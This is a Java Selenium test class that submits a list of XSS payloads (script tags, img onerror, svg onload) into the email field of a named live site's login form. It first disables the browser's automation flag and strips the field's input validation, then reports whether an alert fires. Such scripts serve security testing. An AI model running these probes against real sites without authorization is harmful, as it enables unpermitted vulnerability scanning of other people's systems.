package com.snbat;

import java.time.Duration;
import java.util.Arrays;
import java.util.List;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.WebDriverWait;

import com.snbat.utils.Config;

public class XSSInjectionTest {
    private WebDriver driver;
    private WebDriverWait wait;
    private JavascriptExecutor js;

    private final List<String> payloads = Arrays.asList(
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>"
    );

    @BeforeEach
    public void setUp() {
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--disable-blink-features=AutomationControlled");
        options.addArguments("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

        driver = new ChromeDriver(options);
        js = (JavascriptExecutor) driver; // ✅ Cast here
        wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        driver.manage().window().maximize();
    }

    @Test
    public void testXssInEmailField() {
        for (String payload : payloads) {
            try {
                driver.get("https://hmizate.ma/connexion?back=my-account");

                WebElement emailField = driver.findElement(By.name("email"));

                // ✅ Safely use js after it has been initialized
                js.executeScript("arguments[0].setAttribute('type', 'text'); arguments[0].removeAttribute('required');", emailField);

                emailField.clear();
                emailField.sendKeys(payload);

                WebElement passwordField = driver.findElement(By.id("field-password"));
                passwordField.clear();
                passwordField.sendKeys("dummyPassword");

                WebElement loginButton = driver.findElement(By.id("submit-login"));
                loginButton.click();

                // Wait and check for JavaScript alert (indicating XSS)
                try {
                    Alert alert = driver.switchTo().alert();
                    System.out.println("❗ XSS vulnerability detected! Alert text: " + alert.getText() + " | Payload: " + payload);
                    alert.dismiss();
                } catch (NoAlertPresentException e) {
                    System.out.println("✅ No XSS alert triggered for payload: " + payload);
                }

                Thread.sleep(2000); // Pause to observe

            } catch (Exception e) {
                System.out.println("⚠️ Error testing payload \"" + payload + "\": " + e.getMessage());
            }
        }

        driver.quit();
    }
}
